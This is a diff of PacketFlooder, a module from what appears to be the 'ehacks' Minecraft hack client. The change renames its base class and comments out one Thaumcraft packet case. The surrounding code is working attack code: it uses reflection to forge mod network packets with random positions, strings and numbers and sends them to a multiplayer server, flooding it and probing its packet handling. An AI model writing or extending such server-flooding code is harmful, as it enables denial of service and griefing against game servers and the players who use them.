@@ -27,14 +27,14 @@ import net.minecraft.nbt.NBTTagCompound;
 import net.minecraft.tileentity.TileEntity;
 import cpw.mods.fml.common.network.simpleimpl.IMessage;
 import cpw.mods.fml.common.network.simpleimpl.SimpleNetworkWrapper;
-import ehacks.api.module.Mod;
+import ehacks.api.module.Module;
 import ehacks.mod.gui.EHacksClickGui;
 import ehacks.mod.util.Random;
 import ehacks.mod.wrapper.ModuleCategory;
 import ehacks.mod.wrapper.Wrapper;
 
 public class PacketFlooder
-extends Mod {
+extends Module {
     private ArrayList<FakePacket> validPackets = new ArrayList<FakePacket>();
     
     private Random rand = new Random();
@@ -341,9 +341,9 @@ extends Mod {
                     case THAUMCRAFT_Note:
                         SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("thaumcraft.common.lib.network.PacketHandler").getDeclaredField("INSTANCE").get(null), packetClass.getDeclaredConstructor(int.class, int.class, int.class, int.class).newInstance(rand.x(), rand.y(), rand.z(), 0));
                         break;
-                    case THAUMCRAFT_FocusChange:
-                        SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("thaumcraft.common.lib.network.PacketHandler").getDeclaredField("INSTANCE").get(null), packetClass.getDeclaredConstructor(EntityPlayer.class, String.class).newInstance(Wrapper.INSTANCE.player(), rand.str()));
-                        break;
+                    //case THAUMCRAFT_FocusChange:
+                    //    SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("thaumcraft.common.lib.network.PacketHandler").getDeclaredField("INSTANCE").get(null), packetClass.getDeclaredConstructor(EntityPlayer.class, String.class).newInstance(Wrapper.INSTANCE.player(), rand.str()));
+                    //    break;
                     case THAUMCRAFT_ItemKey:
                         SimpleNetworkWrapper.class.getDeclaredMethod("sendToServer", IMessage.class).invoke(Class.forName("thaumcraft.common.lib.network.PacketHandler").getDeclaredField("INSTANCE").get(null), packetClass.getDeclaredConstructor(EntityPlayer.class, int.class).newInstance(Wrapper.INSTANCE.player(), rand.num()));
                         break;
